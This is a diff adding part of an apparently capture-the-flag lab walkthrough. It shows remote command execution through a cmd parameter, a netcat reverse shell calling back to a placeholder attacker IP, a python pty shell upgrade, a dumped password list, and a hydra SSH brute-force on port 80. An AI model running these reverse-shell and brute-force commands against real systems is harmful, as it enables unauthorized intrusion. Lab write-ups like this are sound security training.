@@ -158,3 +158,84 @@ Password: TplFxiSHjY
 └─# 
 ```
 I got a credential, lets try it on /recovery.php
+After entering it i got a page with a text   
+`GET me a 'cmd' and I'll run it for you Future-Jack. `  
+adding a ?cmd=whoami will confirm we got a RCE(Remote Code Excecution)
+`GET me a 'cmd' and I'll run it for you Future-Jack. www-data www-data`
+Next is to get a reverse shell, first thing to do is to set up a listener on the attacking machine, i use this command.
+```
+nc -lvnp 4444
+```
+after that run the reverse shell command on the cmd  
+```
+nc -e /bin/sh YOUR_MACHINE_IP 4444
+```
+After running it:
+```
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.171.38] from (UNKNOWN) [10.49.177.121] 55720
+whoami
+www-data
+```
+The next step is to upgrade the shell into a interactive shell.
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+After upgrading the shell i first try to go into /home
+```
+www-data@jack-of-all-trades:/var/www/html$ cd /home
+cd /home
+www-data@jack-of-all-trades:/home$ ls
+ls
+jack  jacks_password_list
+```
+i see the home directory for jack and a file called jacks_password_list.
+```
+*hclqAzj+2GC+=0K
+eN<A@n^zI?FE$I5,
+X<(@zo2XrEN)#MGC
+,,aE1K,nW3Os,afb
+ITMJpGGIqg1jn?>@
+0HguX{,fgXPE;8yF
+sjRUb4*@pz<*ZITu
+[8V7o^gl(Gjt5[WB
+yTq0jI$d}Ka<T}PD
+Sc.[[2pL<>e)vC4}
+9;}#q*,A4wd{<X.T
+M41nrFt#PcV=(3%p
+GZx.t)H$&awU;SO<
+.MVettz]a;&Z;cAC
+2fh%i9Pr5YiYIf51
+TDF@mdEd3ZQ(]hBO
+v]XBmwAk8vk5t3EF
+9iYZeZGQGG9&W4d1
+8TIFce;KjrBWTAY^
+SeUAwt7EB#fY&+yt
+n.FZvJ.x9sYe5s5d
+8lN{)g32PG,1?[pM
+z@e1PmlmQ%k5sDz@
+ow5APF>6r,y4krSo
+```
+The next step i think is to use this password list for bruteforcing ssh.
+```
+# hydra -l jack -P pwlist 10.49.1 ssh -s 80
+```
+don't forget that ssh are on port 80 so you need to specify it with -s
+```
+└─# hydra -l jack -P pwlist 10.49.183.69 ssh -s 80
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-26 23:51:31
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
+[DATA] attacking ssh://10.49.183.69:80/
+[80][ssh] host: 10.49.183.69   login: jack   password: <REDACTED>
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-26 23:51:35
+```
+So i got a valid ssh password for jack, lets try logging in with ssh now
+
